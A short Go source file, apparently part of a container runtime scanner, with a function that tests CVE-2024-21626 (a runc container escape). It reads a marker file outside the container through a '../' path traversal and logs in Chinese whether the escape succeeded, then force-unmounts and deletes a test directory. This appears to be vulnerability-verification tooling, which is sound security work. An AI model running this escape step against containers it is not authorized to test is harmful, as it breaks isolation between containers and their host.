package exp

import (
	"Container_runtime_scanner/internal/data"
	"Container_runtime_scanner/internal/docker"
	"log"
)

func Exploit_cve_2024_21626(logger *log.Logger, cont *docker.Container) {
	logger.Println("CVE-2024-21626 逃逸")

	response := cont.ShExecStep("cat ../../../../../../tmp/Container_runtime_scanner")

	if data.RegexGetBool("Container_runtime_scanner_123456", response) {
		logger.Println("验证漏洞成功，并成功逃逸·")
	} else {
		logger.Println("逃逸失败")
	}

	logger.Println("删除测试记录")
	cont.ShExecStep("umount -f /test2")
	cont.ShExecStep("rm -r /test2")
	logger.Println("----------------------")

}
